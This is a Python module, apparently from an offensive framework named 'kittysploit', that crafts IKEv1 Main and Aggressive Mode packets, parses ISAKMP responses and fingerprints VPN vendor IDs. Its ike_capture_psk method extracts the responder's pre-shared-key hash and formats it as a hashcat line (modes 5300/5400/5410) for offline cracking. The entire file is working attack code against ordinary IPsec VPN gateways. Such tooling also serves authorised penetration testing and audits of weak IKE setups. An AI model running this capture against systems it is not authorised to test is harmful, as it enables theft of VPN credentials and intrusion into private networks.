#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""IKEv1 ISAKMP helpers — packet construction, parsing, and PSK capture."""

from __future__ import annotations

import os
import socket
import struct
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from core.framework.base_module import BaseModule
from core.framework.option import OptBool, OptFloat, OptPort, OptString

# --- ISAKMP constants (RFC 2408 / 2409, ike-scan compatible) ---

NEXT_NONE = 0
NEXT_SA = 1
NEXT_P = 2
NEXT_T = 3
NEXT_KE = 4
NEXT_ID = 5
NEXT_HASH = 8
NEXT_NONCE = 10
NEXT_N = 11
NEXT_VID = 13

XCHG_MAIN = 2
XCHG_AGGR = 4

DOI_IPSEC = 1
SIT_IDENTITY_ONLY = 1
PROTO_ISAKMP = 1
KEY_IKE = 1

OAKLEY_DES = 1
OAKLEY_3DES = 5
OAKLEY_SHA = 2
OAKLEY_MD5 = 1
OAKLEY_SHA256 = 5
OAKLEY_PSK = 1
OAKLEY_RSA = 3

ID_IPV4 = 1
ID_FQDN = 2
ID_USER_FQDN = 3

ATTR_ENC = 1
ATTR_HASH = 2
ATTR_AUTH = 3
ATTR_GROUP = 4
ATTR_LIFE_TYPE = 11
ATTR_LIFE_DURATION = 12

LIFE_SECONDS = 1

DEFAULT_LIFETIME = 28800
DEFAULT_NONCE_LEN = 20
DEFAULT_DH_GROUP = 2

DH_GROUP_SIZES = {
    1: 96,
    2: 128,
    5: 192,
    14: 256,
    15: 384,
    16: 512,
    17: 768,
    18: 1024,
    19: 64,
    20: 96,
    21: 132,
}

ENC_NAMES = {1: "DES", 5: "3DES", 7: "AES"}
HASH_NAMES = {1: "MD5", 2: "SHA1", 5: "SHA256"}
AUTH_NAMES = {1: "PSK", 2: "DSS", 3: "RSA", 64221: "XAUTH", 65001: "HybridInitRSA"}
GROUP_NAMES = {
    1: "modp768",
    2: "modp1024",
    5: "modp1536",
    14: "modp2048",
    15: "modp3072",
    16: "modp4096",
}

KNOWN_VIDS = {
    "12f5f28c": "Cisco Unity",
    "afcad713": "Dead Peer Detection v1.0",
    "09002689": "Cisco XAUTH",
    "1f07f70e": "StrongSwan",
    "4048b7d5": "IKE Fragmentation",
    "760515c5": "FRAGMENTATION",
}


@dataclass
class IkeTransform:
    encryption: int = 0
    hash_alg: int = 0
    auth: int = 0
    group: int = 0

    def label(self) -> str:
        enc = ENC_NAMES.get(self.encryption, str(self.encryption))
        hsh = HASH_NAMES.get(self.hash_alg, str(self.hash_alg))
        auth = AUTH_NAMES.get(self.auth, str(self.auth))
        grp = GROUP_NAMES.get(self.group, f"group{self.group}")
        return f"Enc={enc} Hash={hsh} Auth={auth} Group={grp}"


@dataclass
class PskCapture:
    host: str
    port: int
    id_value: str
    dh_group: int
    initiator_cookie: bytes
    responder_cookie: bytes
    g_xi: bytes
    g_xr: bytes
    sai_b: bytes
    idir_b: bytes
    ni_b: bytes
    nr_b: bytes
    hash_r: bytes
    transforms: List[IkeTransform] = field(default_factory=list)
    vendor_ids: List[str] = field(default_factory=list)
    summary: str = ""

    @property
    def hashcat_line(self) -> str:
        parts = [
            self.g_xr.hex(),
            self.g_xi.hex(),
            self.responder_cookie.hex(),
            self.initiator_cookie.hex(),
            self.sai_b.hex(),
            self.idir_b.hex(),
            self.ni_b.hex(),
            self.nr_b.hex(),
            self.hash_r.hex(),
        ]
        return ":".join(parts)

    @property
    def hashcat_mode(self) -> int:
        length = len(self.hash_r)
        if length == 16:
            return 5300
        if length == 20:
            return 5400
        if length == 32:
            return 5410
        return 0

    @property
    def complete(self) -> bool:
        required = (
            self.g_xr,
            self.g_xi,
            self.responder_cookie,
            self.initiator_cookie,
            self.sai_b,
            self.idir_b,
            self.ni_b,
            self.nr_b,
            self.hash_r,
        )
        return all(required)


def _hex(b: bytes) -> str:
    return b.hex()


def _attr_basic(attr_type: int, value: int) -> bytes:
    return struct.pack("!HH", attr_type | 0x8000, value)


def _attr_variable(attr_type: int, data: bytes) -> bytes:
    return struct.pack("!HH", attr_type, len(data)) + data


def _build_transform(
    number: int,
    next_payload: int,
    enc: int,
    hash_alg: int,
    auth: int,
    group: int,
    lifetime: int = DEFAULT_LIFETIME,
) -> bytes:
    attrs = b"".join(
        [
            _attr_basic(ATTR_ENC, enc),
            _attr_basic(ATTR_HASH, hash_alg),
            _attr_basic(ATTR_AUTH, auth),
            _attr_basic(ATTR_GROUP, group),
            _attr_basic(ATTR_LIFE_TYPE, LIFE_SECONDS),
            _attr_variable(ATTR_LIFE_DURATION, struct.pack("!I", lifetime)),
        ]
    )
    length = 8 + len(attrs)
    hdr = struct.pack("!BBHBBH", next_payload, 0, length, number, KEY_IKE, 0)
    return hdr + attrs


def _build_proposal(transforms: bytes, next_payload: int = NEXT_NONE) -> bytes:
    length = 8 + len(transforms)
    hdr = struct.pack("!BBHBBBB", next_payload, 0, length, 1, PROTO_ISAKMP, 0, 1)
    return hdr + transforms


def _build_sa(proposals: bytes, next_payload: int) -> bytes:
    length = 12 + len(proposals)
    hdr = struct.pack("!BBHII", next_payload, 0, length, DOI_IPSEC, SIT_IDENTITY_ONLY)
    return hdr + proposals


def _build_ke(next_payload: int, ke_data: bytes) -> bytes:
    length = 4 + len(ke_data)
    return struct.pack("!BBH", next_payload, 0, length) + ke_data


def _build_nonce(next_payload: int, nonce: bytes) -> bytes:
    length = 4 + len(nonce)
    return struct.pack("!BBH", next_payload, 0, length) + nonce


def _build_id(next_payload: int, id_type: int, id_data: bytes) -> bytes:
    body = struct.pack("!BBH", id_type, 0, 0) + id_data
    length = 4 + len(body)
    return struct.pack("!BBH", next_payload, 0, length) + body


def _build_header(
    icookie: bytes,
    rcookie: bytes,
    next_payload: int,
    exchange: int,
    total_length: int,
) -> bytes:
    return struct.pack(
        "!8s8sBBBBII",
        icookie,
        rcookie,
        next_payload,
        0x10,
        exchange,
        0,
        0,
        total_length,
    )


def build_main_mode_packet(auth_method: int = OAKLEY_PSK) -> Tuple[bytes, bytes]:
    """Build IKEv1 Main Mode initiation (SA only). Returns (packet, icookie)."""
    transforms = b"".join(
        [
            _build_transform(1, NEXT_T, OAKLEY_3DES, OAKLEY_SHA, auth_method, 2),
            _build_transform(2, NEXT_T, OAKLEY_3DES, OAKLEY_MD5, auth_method, 2),
            _build_transform(3, NEXT_T, OAKLEY_3DES, OAKLEY_SHA, auth_method, 1),
            _build_transform(4, NEXT_T, OAKLEY_3DES, OAKLEY_MD5, auth_method, 1),
            _build_transform(5, NEXT_T, OAKLEY_DES, OAKLEY_SHA, auth_method, 2),
            _build_transform(6, NEXT_T, OAKLEY_DES, OAKLEY_MD5, auth_method, 2),
            _build_transform(7, NEXT_T, OAKLEY_DES, OAKLEY_SHA, auth_method, 1),
            _build_transform(8, NEXT_NONE, OAKLEY_DES, OAKLEY_MD5, auth_method, 1),
        ]
    )
    proposal = _build_proposal(transforms)
    sa = _build_sa(proposal, NEXT_NONE)
    icookie = os.urandom(8)
    hdr = _build_header(icookie, b"\x00" * 8, NEXT_SA, XCHG_MAIN, 28 + len(sa))
    return hdr + sa, icookie


def build_aggressive_packet(
    id_value: bytes,
    id_type: int = ID_USER_FQDN,
    auth_method: int = OAKLEY_PSK,
    dh_group: int = DEFAULT_DH_GROUP,
    nonce_len: int = DEFAULT_NONCE_LEN,
) -> Tuple[bytes, bytes, bytes]:
    """
    Build IKEv1 Aggressive Mode initiation for PSK capture.
    Returns (packet, icookie, initiator_nonce).
    """
    kx_len = DH_GROUP_SIZES.get(dh_group, 128)
    transforms = b"".join(
        [
            _build_transform(1, NEXT_T, OAKLEY_3DES, OAKLEY_SHA, auth_method, dh_group),
            _build_transform(2, NEXT_T, OAKLEY_3DES, OAKLEY_MD5, auth_method, dh_group),
            _build_transform(3, NEXT_T, OAKLEY_DES, OAKLEY_SHA, auth_method, dh_group),
            _build_transform(4, NEXT_NONE, OAKLEY_DES, OAKLEY_MD5, auth_method, dh_group),
        ]
    )
    proposal = _build_proposal(transforms)
    sa = _build_sa(proposal, NEXT_KE)

    icookie = os.urandom(8)
    nonce_i = os.urandom(nonce_len)
    ke_data = os.urandom(kx_len)

    id_payload = _build_id(NEXT_NONE, id_type, id_value)
    nonce_payload = _build_nonce(NEXT_ID, nonce_i)
    ke_payload = _build_ke(NEXT_NONCE, ke_data)

    body = sa + ke_payload + nonce_payload + id_payload
    hdr = _build_header(icookie, b"\x00" * 8, NEXT_SA, XCHG_AGGR, 28 + len(body))
    return hdr + body, icookie, nonce_i


def _parse_attributes(data: bytes) -> IkeTransform:
    transform = IkeTransform()
    offset = 0
    while offset + 4 <= len(data):
        atype, alen = struct.unpack_from("!HH", data, offset)
        offset += 4
        basic = bool(atype & 0x8000)
        attr_id = atype & 0x7FFF
        if basic:
            value = alen
            payload = b""
        else:
            value = 0
            payload = data[offset : offset + alen]
            offset += alen
        if attr_id == ATTR_ENC:
            transform.encryption = value
        elif attr_id == ATTR_HASH:
            transform.hash_alg = value
        elif attr_id == ATTR_AUTH:
            transform.auth = value
        elif attr_id == ATTR_GROUP:
            transform.group = value
        elif attr_id == ATTR_LIFE_DURATION and payload:
            pass
    return transform


def _vid_name(raw: bytes) -> str:
    hx = raw.hex()
    for prefix, label in KNOWN_VIDS.items():
        if hx.startswith(prefix):
            return label
    return f"VID={hx[:24]}..."


def _parse_id(data: bytes) -> str:
    if len(data) < 8:
        return data.hex()
    id_type = data[4]
    id_body = data[8:]
    if id_type == ID_IPV4 and len(id_body) >= 4:
        return ".".join(str(b) for b in id_body[:4])
    try:
        return id_body.decode("utf-8", errors="replace")
    except Exception:
        return id_body.hex()


def parse_isakmp_response(data: bytes) -> Dict[str, Any]:
    """Parse an IKE/ISAKMP response into structured fields."""
    result: Dict[str, Any] = {
        "valid": False,
        "ike_version": 0,
        "exchange": 0,
        "exchange_name": "",
        "initiator_cookie": b"",
        "responder_cookie": b"",
        "transforms": [],
        "vendor_ids": [],
        "id_responder": "",
        "hash_r": b"",
        "nonce_i": b"",
        "nonce_r": b"",
        "g_xi": b"",
        "g_xr": b"",
        "sai_b": b"",
        "idir_b": b"",
        "ni_b": b"",
        "nr_b": b"",
        "summary_parts": [],
        "supports_xauth": False,
        "supports_aggressive": False,
        "supports_main": False,
    }

    if len(data) < 28:
        return result

    icookie, rcookie, next_p, version, exchange, _flags, _msgid, total_len = struct.unpack(
        "!8s8sBBBBII", data[:28]
    )
    if total_len > len(data):
        total_len = len(data)

    result["valid"] = True
    result["initiator_cookie"] = icookie
    result["responder_cookie"] = rcookie
    result["ike_version"] = (version >> 4) if version else 1
    result["exchange"] = exchange
    if exchange == XCHG_MAIN:
        result["exchange_name"] = "Main Mode"
        result["supports_main"] = True
    elif exchange == XCHG_AGGR:
        result["exchange_name"] = "Aggressive Mode"
        result["supports_aggressive"] = True
    else:
        result["exchange_name"] = f"Exchange-{exchange}"

    offset = 28
    payload_type = next_p
    sai_b = b""
    idir_b = b""

    while payload_type != NEXT_NONE and offset + 4 <= total_len:
        next_payload, _reserved, plen = struct.unpack_from("!BBH", data, offset)
        if plen < 4 or offset + plen > total_len:
            break
        body = data[offset + 4 : offset + plen]
        payload_data = data[offset:offset + plen]

        if payload_type == NEXT_SA and len(body) >= 12:
            prop_start = 8  # after DOI + Situation inside SA body
            if prop_start + 8 <= len(body):
                spi_size = body[prop_start + 6]
                notrans = body[prop_start + 7]
                t_offset = prop_start + 8 + spi_size
                for _ in range(max(notrans, 1)):
                    if t_offset + 8 > len(body):
                        break
                    t_next, _t1, t_len, _tnum, _tid, _t2 = struct.unpack_from(
                        "!BBHBBH", body, t_offset
                    )
                    attrs = body[t_offset + 8 : t_offset + t_len]
                    transform = _parse_attributes(attrs)
                    if transform.encryption or transform.hash_alg:
                        result["transforms"].append(transform)
                    t_offset += t_len
                    if t_next == NEXT_NONE:
                        break
            sai_b = payload_data[4:]

        elif payload_type == NEXT_KE:
            result["g_xr"] = body
        elif payload_type == NEXT_NONCE:
            if not result["nonce_r"]:
                result["nonce_r"] = body
                result["nr_b"] = body
            else:
                result["nonce_i"] = body
                result["ni_b"] = body
        elif payload_type == NEXT_ID:
            parsed = _parse_id(payload_data)
            result["id_responder"] = parsed
            idir_b = payload_data[4:]
        elif payload_type == NEXT_HASH:
            result["hash_r"] = body
        elif payload_type == NEXT_VID:
            label = _vid_name(body)
            result["vendor_ids"].append(label)
            if "XAUTH" in label.upper():
                result["supports_xauth"] = True
        elif payload_type == NEXT_N:
            if len(body) >= 4:
                notify_type = struct.unpack_from("!H", body, 2)[0]
                if notify_type in (14, 15):
                    result["summary_parts"].append(f"Notify={notify_type}")

        offset += plen
        payload_type = next_payload

    result["sai_b"] = sai_b
    result["idir_b"] = idir_b

    parts = [result["exchange_name"]]
    if rcookie != b"\x00" * 8:
        parts.append(f"CKY-R={rcookie.hex()}")
    if result["transforms"]:
        parts.append("SA=(" + result["transforms"][0].label() + ")")
    for vid in result["vendor_ids"]:
        parts.append(f"VID={vid}")
    if result["id_responder"]:
        parts.append(f"ID={result['id_responder']!r}")
    if result["g_xr"]:
        parts.append(f"KeyExchange({len(result['g_xr'])} bytes)")
    if result["nonce_r"]:
        parts.append(f"Nonce({len(result['nonce_r'])} bytes)")
    if result["hash_r"]:
        parts.append(f"Hash({len(result['hash_r'])} bytes)")
    result["summary"] = " ".join(parts)
    return result


def ike_udp_send_recv(
    host: str,
    port: int,
    packet: bytes,
    timeout: float = 3.0,
    nat_t: bool = False,
) -> Optional[bytes]:
    """Send an IKE UDP datagram and return the response, if any."""
    payload = b"\x00" * 4 + packet if nat_t else packet
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(payload, (host, port))
        data, _addr = sock.recvfrom(65535)
        if nat_t and len(data) >= 4:
            data = data[4:]
        return data
    except (socket.timeout, OSError):
        return None
    finally:
        sock.close()


class Ike(BaseModule):
    """Mixin for IKEv1 scanner and auxiliary modules."""

    target = OptString("", "Target hostname or IP", True)
    port = OptPort(500, "IKE UDP port (500 or 4500 for NAT-T)", True)
    timeout = OptFloat(3.0, "UDP probe timeout in seconds", False, advanced=True)
    nat_t = OptBool(False, "Use NAT-T encapsulation (4-byte zero prefix, port 4500)", False)

    def _ike_host(self) -> str:
        host = str(getattr(self.target, "value", None) or self.target or "").strip()
        if not host:
            return ""
        try:
            return socket.gethostbyname(host)
        except OSError:
            return host

    def _ike_port(self) -> int:
        port = int(getattr(self.port, "value", None) or self.port or 500)
        if self._ike_nat_t() and port == 500:
            return 4500
        return port

    def _ike_timeout(self) -> float:
        return max(0.5, float(getattr(self.timeout, "value", None) or self.timeout or 3.0))

    def _ike_nat_t(self) -> bool:
        value = getattr(self.nat_t, "value", None)
        if value is None:
            value = self.nat_t
        return bool(value)

    def ike_probe(
        self,
        exchange: str = "main",
        auth_method: int = OAKLEY_PSK,
        id_value: Optional[str] = None,
        id_type: int = ID_USER_FQDN,
        dh_group: int = DEFAULT_DH_GROUP,
    ) -> Dict[str, Any]:
        """Probe target for IKE service. exchange: main or aggressive."""
        host = self._ike_host()
        if not host:
            return {"status": "error", "reason": "No target specified"}

        port = self._ike_port()
        timeout = self._ike_timeout()
        nat_t = self._ike_nat_t()

        if exchange.lower().startswith("agg"):
            id_bytes = (id_value or "kittysploit").encode("utf-8")
            packet, icookie, _nonce_i = build_aggressive_packet(
                id_bytes, id_type=id_type, auth_method=auth_method, dh_group=dh_group
            )
            mode = "aggressive"
        else:
            packet, icookie = build_main_mode_packet(auth_method=auth_method)
            mode = "main"

        response = ike_udp_send_recv(host, port, packet, timeout=timeout, nat_t=nat_t)
        if not response:
            return {
                "status": "closed",
                "reason": f"No IKE response on UDP {port}",
                "host": host,
                "port": port,
                "mode": mode,
            }

        parsed = parse_isakmp_response(response)
        if not parsed.get("valid"):
            return {
                "status": "error",
                "reason": "Received datagram is not a valid ISAKMP response",
                "host": host,
                "port": port,
                "mode": mode,
            }

        return {
            "status": "ok",
            "reason": parsed.get("summary") or "IKE endpoint responded",
            "host": host,
            "port": port,
            "mode": mode,
            "initiator_cookie": icookie,
            "parsed": parsed,
            "raw_length": len(response),
        }

    def ike_capture_psk(
        self,
        id_value: str = "kittysploit",
        id_type: int = ID_USER_FQDN,
        dh_group: int = DEFAULT_DH_GROUP,
        auth_method: int = OAKLEY_PSK,
    ) -> Dict[str, Any]:
        """Run IKEv1 Aggressive Mode and extract offline PSK crack material."""
        host = self._ike_host()
        if not host:
            return {"status": "error", "reason": "No target specified"}

        port = self._ike_port()
        timeout = self._ike_timeout()
        nat_t = self._ike_nat_t()
        id_bytes = id_value.encode("utf-8")

        packet, icookie, _nonce_i = build_aggressive_packet(
            id_bytes,
            id_type=id_type,
            auth_method=auth_method,
            dh_group=dh_group,
        )
        response = ike_udp_send_recv(host, port, packet, timeout=timeout, nat_t=nat_t)
        if not response:
            return {
                "status": "closed",
                "reason": f"No IKE response on UDP {port}",
                "host": host,
                "port": port,
            }

        parsed = parse_isakmp_response(response)
        if not parsed.get("valid"):
            return {"status": "error", "reason": "Invalid ISAKMP response", "host": host, "port": port}

        if not parsed.get("hash_r"):
            return {
                "status": "no_hash",
                "reason": "Aggressive Mode response did not include HASH payload",
                "host": host,
                "port": port,
                "parsed": parsed,
                "summary": parsed.get("summary"),
            }

        capture = self._psk_from_exchange(
            packet, icookie, _nonce_i, parsed, host, port, id_value, dh_group
        )

        if not capture.complete:
            return {
                "status": "incomplete",
                "reason": "HASH received but some PSK crack fields are missing",
                "host": host,
                "port": port,
                "capture": capture,
                "summary": parsed.get("summary"),
            }

        return {
            "status": "captured",
            "reason": "IKE PSK hash material captured for offline cracking",
            "host": host,
            "port": port,
            "capture": capture,
            "hashcat_line": capture.hashcat_line,
            "hashcat_mode": capture.hashcat_mode,
            "summary": parsed.get("summary"),
        }

    def _psk_from_exchange(
        self,
        sent: bytes,
        icookie: bytes,
        nonce_i: bytes,
        parsed: Dict[str, Any],
        host: str,
        port: int,
        id_value: str,
        dh_group: int,
    ) -> PskCapture:
        """Walk the sent packet to recover initiator PSK crack fields."""
        g_xi = b""
        sai_b = b""
        offset = 28
        next_p = sent[16]
        total = struct.unpack_from("!I", sent, 24)[0]

        while next_p != NEXT_NONE and offset + 4 <= total:
            next_payload, _r, plen = struct.unpack_from("!BBH", sent, offset)
            chunk = sent[offset : offset + plen]
            body = chunk[4:]
            if next_p == NEXT_SA:
                sai_b = body
            elif next_p == NEXT_KE:
                g_xi = body
            offset += plen
            next_p = next_payload

        return PskCapture(
            host=host,
            port=port,
            id_value=id_value,
            dh_group=dh_group,
            initiator_cookie=icookie,
            responder_cookie=parsed.get("responder_cookie", b""),
            g_xi=g_xi,
            g_xr=parsed.get("g_xr", b""),
            sai_b=sai_b,
            idir_b=parsed.get("idir_b", b""),
            ni_b=nonce_i,
            nr_b=parsed.get("nr_b", b""),
            hash_r=parsed.get("hash_r", b""),
            transforms=parsed.get("transforms", []),
            vendor_ids=parsed.get("vendor_ids", []),
            summary=parsed.get("summary", ""),
        )
